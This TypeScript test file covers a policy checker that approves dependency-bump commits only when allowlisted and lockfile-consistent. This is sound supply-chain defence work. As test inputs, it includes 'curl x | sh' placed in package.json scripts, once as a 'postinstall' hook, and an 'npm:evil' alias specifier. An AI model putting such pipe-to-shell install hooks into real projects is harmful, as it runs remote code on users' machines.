import { writeFile } from 'node:fs/promises';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { FIXTURE_TSCONFIG_JSON, type GitRepoFixture, makeGitRepo } from '../test-helpers.ts';
import type { Waiver } from '../types.ts';
import { validateCommit } from '../validate-commit.ts';
import { manifestBumpViolations, matchesAllowlist } from './deps.ts';

describe('matchesAllowlist', () => {
  it('matches exact names', () => {
    expect(matchesAllowlist('lodash', ['lodash'])).toBe(true);
    expect(matchesAllowlist('lodash-es', ['lodash'])).toBe(false);
  });

  it('matches `@scope/*` as a scope prefix', () => {
    expect(matchesAllowlist('@myorg/foo', ['@myorg/*'])).toBe(true);
    expect(matchesAllowlist('@myorg-evil/foo', ['@myorg/*'])).toBe(false);
    expect(matchesAllowlist('@myorg', ['@myorg/*'])).toBe(false);
  });
});

describe('manifestBumpViolations', () => {
  const allow = ['lodash', '@myorg/*'];
  const base = {
    name: 'fixture',
    dependencies: { lodash: '^1.0.0', 'left-pad': '^1.0.0' },
    devDependencies: { '@myorg/a': '1.0.0' },
    scripts: { build: 'tsc' },
  };

  it('accepts an allowlisted up-move (caret major bump)', () => {
    const head = { ...base, dependencies: { lodash: '^2.0.0', 'left-pad': '^1.0.0' } };
    expect(manifestBumpViolations(base, head, allow)).toEqual([]);
  });

  it('accepts an exact-pin up-move', () => {
    const head = { ...base, dependencies: { lodash: '1.5.0', 'left-pad': '^1.0.0' } };
    expect(manifestBumpViolations(base, head, allow)).toEqual([]);
  });

  it('accepts identical manifests', () => {
    expect(manifestBumpViolations(base, base, allow)).toEqual([]);
  });

  it('rejects a change to a non-allowlisted package', () => {
    const head = { ...base, dependencies: { lodash: '^1.0.0', 'left-pad': '^2.0.0' } };
    expect(manifestBumpViolations(base, head, allow)).toEqual([
      "dependencies: 'left-pad' is not on allowBumping",
    ]);
  });

  it('rejects an added dependency', () => {
    const head = {
      ...base,
      dependencies: { lodash: '^1.0.0', 'left-pad': '^1.0.0', '@myorg/new': '1.0.0' },
    };
    expect(manifestBumpViolations(base, head, allow)).toEqual(["dependencies: '@myorg/new' added"]);
  });

  it('accepts a removed dependency, even a non-allowlisted one', () => {
    // `left-pad` is not on the allowlist; removal still needs no allowlist entry.
    const head = { ...base, dependencies: { lodash: '^1.0.0' } };
    expect(manifestBumpViolations(base, head, allow)).toEqual([]);
  });

  it('rejects a change to a non-dependency field', () => {
    const head = { ...base, scripts: { build: 'tsc', evil: 'curl x | sh' } };
    expect(manifestBumpViolations(base, head, allow)).toEqual(["field 'scripts' changed"]);
  });

  it('rejects a downward move (widening below base floor)', () => {
    const head = { ...base, dependencies: { lodash: '>=0.1.0', 'left-pad': '^1.0.0' } };
    const v = manifestBumpViolations(base, head, allow);
    expect(v.length).toBe(1);
    expect(v[0]).toContain('below base floor');
  });

  it('rejects a re-widening union that re-admits low versions', () => {
    const head = { ...base, dependencies: { lodash: '^1.0.0 || >=0.0.0', 'left-pad': '^1.0.0' } };
    const v = manifestBumpViolations(base, head, allow);
    expect(v.length).toBe(1);
    expect(v[0]).toContain('below base floor');
  });

  it('rejects a protocol/alias specifier (not plain semver)', () => {
    const head = { ...base, dependencies: { lodash: 'npm:evil@1.0.0', 'left-pad': '^1.0.0' } };
    const v = manifestBumpViolations(base, head, allow);
    expect(v.length).toBe(1);
    expect(v[0]).toContain('not plain semver');
  });

  it('rejects a non-string version value', () => {
    const head = { ...base, dependencies: { lodash: { evil: true }, 'left-pad': '^1.0.0' } };
    expect(manifestBumpViolations(base, head, allow)).toEqual([
      "dependencies: 'lodash' is not a version string",
    ]);
  });
});

let g: GitRepoFixture | undefined;
afterEach(async () => {
  await g?.cleanup();
  g = undefined;
});

const BASE_LOCK = 'lockfileVersion: "9.0"\n# base resolution\n';
const HEAD_LOCK = 'lockfileVersion: "9.0"\n# head resolution\n';
const ALLOW_JSON = `${JSON.stringify({ allowBumping: ['lodash', '@myorg/*'] })}\n`;
const EMPTY_WAIVER: Waiver = { schema: 'waiver-stamp/v0', ops: [] };

function pkgJson(overrides: Record<string, unknown> = {}): string {
  const manifest = {
    name: 'fixture',
    packageManager: 'pnpm@9.0.0',
    dependencies: { lodash: '^1.0.0', 'left-pad': '^1.0.0' },
    devDependencies: { '@myorg/a': '1.0.0' },
    ...overrides,
  };
  return `${JSON.stringify(manifest, null, 2)}\n`;
}

/** The fake resolver stands in for pnpm: lands O's lockfile on head's bytes. */
async function fakeResolver(dir: string): Promise<void> {
  await writeFile(join(dir, 'pnpm-lock.yaml'), HEAD_LOCK, 'utf8');
}

async function baseCommit(extra: Record<string, string> = {}): Promise<string> {
  if (!g) throw new Error('repo not initialized');
  return g.commit(
    {
      'tsconfig.json': FIXTURE_TSCONFIG_JSON,
      'src/a.ts': 'export const a = 1;\n',
      'package.json': pkgJson(),
      'pnpm-lock.yaml': BASE_LOCK,
      '.waiver-stamp.json': ALLOW_JSON,
      ...extra,
    },
    'base',
  );
}

async function validate(commit: string, resolveLockfile = fakeResolver) {
  if (!g) throw new Error('repo not initialized');
  return validateCommit(EMPTY_WAIVER, { commit, cwd: g.repo, resolveLockfile });
}

describe('dependency-bump policy (validateCommit integration)', () => {
  it('COVERS an allowlisted up-move whose lockfile re-derives exactly', async () => {
    g = await makeGitRepo();
    await baseCommit();
    const head = await g.commit(
      {
        'package.json': pkgJson({ dependencies: { lodash: '^2.0.0', 'left-pad': '^1.0.0' } }),
        'pnpm-lock.yaml': HEAD_LOCK,
      },
      'bump lodash',
    );
    const report = await validate(head);
    expect(report.failures).toEqual([]);
    expect(report.stamped).toBe(true);
  });

  it('FAILS when the re-derived lockfile differs from head', async () => {
    g = await makeGitRepo();
    await baseCommit();
    const head = await g.commit(
      {
        'package.json': pkgJson({ dependencies: { lodash: '^2.0.0', 'left-pad': '^1.0.0' } }),
        'pnpm-lock.yaml': 'lockfileVersion: "9.0"\n# tampered\n',
      },
      'bump + tampered lock',
    );
    const report = await validate(head);
    expect(report.stamped).toBe(false);
    expect(report.failures.join('\n')).toContain('dependency bump not covered');
    expect(report.uncovered).toContain('pnpm-lock.yaml');
  });

  it('FAILS when the bumped package is not on allowBumping', async () => {
    g = await makeGitRepo();
    await baseCommit();
    const head = await g.commit(
      {
        'package.json': pkgJson({ dependencies: { lodash: '^1.0.0', 'left-pad': '^2.0.0' } }),
        'pnpm-lock.yaml': HEAD_LOCK,
      },
      'bump left-pad',
    );
    const report = await validate(head);
    expect(report.stamped).toBe(false);
    expect(report.failures.join('\n')).toContain('not on allowBumping');
  });

  it('FAILS when there is no .waiver-stamp.json (feature off)', async () => {
    g = await makeGitRepo();
    await g.commit(
      {
        'tsconfig.json': FIXTURE_TSCONFIG_JSON,
        'src/a.ts': 'export const a = 1;\n',
        'package.json': pkgJson(),
        'pnpm-lock.yaml': BASE_LOCK,
      },
      'base without config',
    );
    const head = await g.commit(
      {
        'package.json': pkgJson({ dependencies: { lodash: '^2.0.0', 'left-pad': '^1.0.0' } }),
        'pnpm-lock.yaml': HEAD_LOCK,
      },
      'bump lodash',
    );
    const report = await validate(head);
    expect(report.stamped).toBe(false);
    expect(report.failures.join('\n')).toContain('allowBumping');
  });

  it('FAILS on a downward move', async () => {
    g = await makeGitRepo();
    await baseCommit();
    const head = await g.commit(
      {
        'package.json': pkgJson({ dependencies: { lodash: '>=0.1.0', 'left-pad': '^1.0.0' } }),
        'pnpm-lock.yaml': HEAD_LOCK,
      },
      'downgrade lodash',
    );
    const report = await validate(head);
    expect(report.stamped).toBe(false);
    expect(report.failures.join('\n')).toContain('below base floor');
  });

  it('FAILS when a non-dependency manifest field also changed', async () => {
    g = await makeGitRepo();
    await baseCommit();
    const head = await g.commit(
      {
        'package.json': pkgJson({
          dependencies: { lodash: '^2.0.0', 'left-pad': '^1.0.0' },
          scripts: { postinstall: 'curl x | sh' },
        }),
        'pnpm-lock.yaml': HEAD_LOCK,
      },
      'bump + smuggle',
    );
    const report = await validate(head);
    expect(report.stamped).toBe(false);
    expect(report.failures.join('\n')).toContain("field 'scripts' changed");
  });

  it('FAILS on a non-pnpm repo', async () => {
    g = await makeGitRepo();
    await baseCommit({ 'package.json': pkgJson({ packageManager: 'npm@10.0.0' }) });
    const head = await g.commit(
      {
        'package.json': pkgJson({
          packageManager: 'npm@10.0.0',
          dependencies: { lodash: '^2.0.0', 'left-pad': '^1.0.0' },
        }),
        'pnpm-lock.yaml': HEAD_LOCK,
      },
      'bump on npm repo',
    );
    const report = await validate(head);
    expect(report.stamped).toBe(false);
    expect(report.failures.join('\n')).toContain('pnpm');
  });

  it('FAILS with the resolver error when re-resolution blows up', async () => {
    g = await makeGitRepo();
    await baseCommit();
    const head = await g.commit(
      {
        'package.json': pkgJson({ dependencies: { lodash: '^2.0.0', 'left-pad': '^1.0.0' } }),
        'pnpm-lock.yaml': HEAD_LOCK,
      },
      'bump lodash',
    );
    const boom = async () => {
      throw new Error('registry unreachable');
    };
    const report = await validate(head, boom);
    expect(report.stamped).toBe(false);
    expect(report.failures.join('\n')).toContain('registry unreachable');
  });

  it('FAILS closed when the PR widens .waiver-stamp.json for itself', async () => {
    g = await makeGitRepo();
    await baseCommit();
    const head = await g.commit(
      {
        'package.json': pkgJson({ dependencies: { lodash: '^1.0.0', 'left-pad': '^2.0.0' } }),
        'pnpm-lock.yaml': HEAD_LOCK,
        '.waiver-stamp.json': `${JSON.stringify({ allowBumping: ['lodash', 'left-pad'] })}\n`,
      },
      'self-widening bump',
    );
    const report = await validate(head);
    expect(report.stamped).toBe(false);
    // base allowlist governs (left-pad not on it)…
    expect(report.failures.join('\n')).toContain('not on allowBumping');
    // …and the config edit itself is uncovered.
    expect(report.uncovered).toContain('.waiver-stamp.json');
  });

  it('FAILS when a source file changes alongside the bump', async () => {
    g = await makeGitRepo();
    await baseCommit();
    const head = await g.commit(
      {
        'package.json': pkgJson({ dependencies: { lodash: '^2.0.0', 'left-pad': '^1.0.0' } }),
        'pnpm-lock.yaml': HEAD_LOCK,
        'src/a.ts': 'export const a = 2;\n',
      },
      'bump + source edit',
    );
    const report = await validate(head);
    expect(report.stamped).toBe(false);
    expect(report.uncovered).toContain('src/a.ts');
  });

  it('COVERS removing a dependency (any package, no allowlist entry needed)', async () => {
    g = await makeGitRepo();
    await baseCommit();
    // Drop `left-pad` (never allowlisted); the lockfile re-resolves to head.
    const head = await g.commit(
      {
        'package.json': pkgJson({ dependencies: { lodash: '^1.0.0' } }),
        'pnpm-lock.yaml': HEAD_LOCK,
      },
      'remove left-pad',
    );
    const report = await validate(head);
    expect(report.failures).toEqual([]);
    expect(report.stamped).toBe(true);
  });

  it('FAILS when adding a dependency (additions stay out of the envelope)', async () => {
    g = await makeGitRepo();
    await baseCommit();
    const head = await g.commit(
      {
        'package.json': pkgJson({
          dependencies: { lodash: '^1.0.0', 'left-pad': '^1.0.0', '@myorg/new': '1.0.0' },
        }),
        'pnpm-lock.yaml': HEAD_LOCK,
      },
      'add @myorg/new',
    );
    const report = await validate(head);
    expect(report.stamped).toBe(false);
    expect(report.failures.join('\n')).toContain("'@myorg/new' added");
  });

  it('leaves package.json uncovered when it did not change (policy dormant)', async () => {
    g = await makeGitRepo();
    await baseCommit();
    const head = await g.commit({ 'src/a.ts': 'export const a = 2;\n' }, 'source only');
    const report = await validate(head);
    // No package.json change → policy does not fire; the source edit is uncovered.
    expect(report.stamped).toBe(false);
    expect(report.uncovered).toEqual(['src/a.ts']);
  });
});
